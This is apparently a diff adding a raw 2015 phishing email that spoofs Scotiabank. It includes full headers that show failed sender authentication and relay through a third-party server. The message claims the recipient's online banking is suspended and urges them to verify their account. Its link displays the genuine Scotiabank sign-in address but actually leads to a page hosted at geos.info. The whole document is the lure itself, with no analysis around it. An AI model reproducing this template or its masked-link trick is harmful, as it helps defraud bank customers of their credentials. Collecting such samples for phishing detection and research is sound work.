@@ -1,0 +1,97 @@
+x-store-info:4r51+eLowCe79NzwdU2kR3P+ctWZsO+J
+Authentication-Results: hotmail.com; spf=softfail (sender IP is 154.0.166.98; identity alignment result is pass and alignment mode is relaxed) smtp.mailfrom=ibsupport@scotiabank.com; dkim=none (identity alignment result is pass and alignment mode is relaxed) header.d=scotiabank.com; x-hmca=fail header.id=ibsupport@scotiabank.com
+X-SID-PRA: ibsupport@scotiabank.com
+X-AUTH-Result: FAIL
+X-SID-Result: FAIL
+X-Message-Status: n:n
+X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MjtHRD0yO1NDTD02
+X-Message-Info: isY2VobhFN9ZCs9kBjCX6d2a0BKwoqHAqQ/bPbEWv9A7WOSE56u8cgkGKorjkeORw3gxOX1nAynoOnYLA08tj3A+XQFs3Y+mmV1P7CAAuA//I7xDysQ3iBG5MMQvcRAtqAaaqK/LHaZnAvveKHWKI/suc7d0jYUwMY078gjjaYnOwcaHlzQ2okozQWcxcT52CthWG4r8PUe4cuHkicwL4Tgucp6t6NHD8uIUKuF56AM=
+Received: from server1.owoninja.com ([154.0.166.98]) by SNT004-MC4F4.hotmail.com over TLS secured channel with Microsoft SMTPSVC(7.5.7601.23008);
+	 Sat, 8 Aug 2015 19:34:30 -0700
+Received: from localhost ([::1]:43177 helo=monosecant.dedicated.co.za)
+	by server1.owoninja.com with esmtpa (Exim 4.85)
+	(envelope-from <ibsupport@scotiabank.com>)
+	id 1ZMfRz-00009s-Mb; Tue, 04 Aug 2015 18:52:27 +0200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="=_7bd8f09f70986beea1f3c89659a02585"
+Date: Tue, 04 Aug 2015 18:52:01 +0200
+From: Scotia Bank <ibsupport@scotiabank.com>
+To: undisclosed-recipients:;
+Subject: ScotiaBank Account: sign-in blocked, Account suspended
+Message-ID: <3a6cbf521468bc2ca009004e7abc54f0@owoninjas.com>
+X-Sender: ibsupport@scotiabank.com
+User-Agent: Roundcube Webmail/1.0.5
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server1.owoninja.com
+X-AntiAbuse: Original Domain - hotmail.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - scotiabank.com
+X-Get-Message-Sender-Via: server1.owoninja.com: authenticated_id: go@owoninjas.com
+Return-Path: ibsupport@scotiabank.com
+X-OriginalArrivalTime: 09 Aug 2015 02:34:31.0168 (UTC) FILETIME=[EBA67800:01D0D24B]
+
+--=_7bd8f09f70986beea1f3c89659a02585
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII
+
+ 
+
+-- 
+
+ [1] 
+
+Attention Internet Banking User, 
+
+ This is to notify you that your Scotia Online Banking has been
+temporally suspend as a result of inactivity. Please click here
+https://www1.scotiaonline.scotiabank.com/online/authentication/authentication.bns
+[2] to reactivate and access to your account. 
+SCOTIA BANK IS INFORMING ALL INTERNET BANKING CUSTOMERS TO VERIFY AND
+UPDATE THEIR ACCOUNT INFORMATION FOR OUR SECURITY UPDATE. 
+
+REGARDS, 
+
+SCOTIA BANK 
+
+Links:
+------
+[1]
+https://www1.scotiaonline.scotiabank.com/online/authentication/authentication.bns
+[2]
+http://geos.info/wp-content/uploads/scotiaonline/SignontoScotiaOnLine.htm
+--=_7bd8f09f70986beea1f3c89659a02585
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">
+<html><body style=3D'font-size: 10pt; font-family: Verdana,Geneva,sans-seri=
+f'>
+<p>&nbsp;</p>
+<div>-- <br />
+<p><a title=3D"This external link will open in a new window" href=3D"https:=
+//www1.scotiaonline.scotiabank.com/online/authentication/authentication.bns=
+"><img src=3D"https://ci3.googleusercontent.com/proxy/xLm7cjP_y0Sqmll3gtFHz=
+KQDmOXMuIOL_IsFIJs_XWGxEkRb3kziQUv6aTR4B-qgy-J0_iN8uSJr5dCS6Xb5ff9UFMcOOwp9=
+RZYZIthxcIY_qL_VXbkrqia7haSJBJw2s000=3Ds0-d-e1-ft#https://www1.scotiaonline=
+=2Escotiabank.com/images/branding/scotiabank-group.gif" alt=3D"Scotiabank G=
+roup" width=3D"215" height=3D"26" /></a></p>
+<p>Attention Internet Banking User,</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; This is to notify you that your&nbsp;<span clas=
+s=3D"il">Scotia</span>&nbsp;Online Banking has been temporally suspend as a=
+ result of inactivity. Please click here&nbsp;<a title=3D"This external lin=
+k will open in a new window" href=3D"http://geos.info/wp-content/uploads/sc=
+otiaonline/SignontoScotiaOnLine.htm">https://www1.scotiaonline.scotiabank=
+=2Ecom/online/authentication/authentication.bns</a>&nbsp;to reactivate and =
+access to your account.</p>
+<div><span><strong><span class=3D"il">Scotia</span>&nbsp;<span class=3D"il"=
+>Bank</span>&nbsp;is informing all internet banking customers to verify and=
+ update their account information for our security update.</strong></span><=
+/div>
+<p><span><strong>Regards,</strong></span></p>
+<p><span><strong><span class=3D"il">Scotia</span>&nbsp;<span class=3D"il">B=
+ank</span></strong></span></p>
+</div>
+</body></html>
+
+--=_7bd8f09f70986beea1f3c89659a02585--
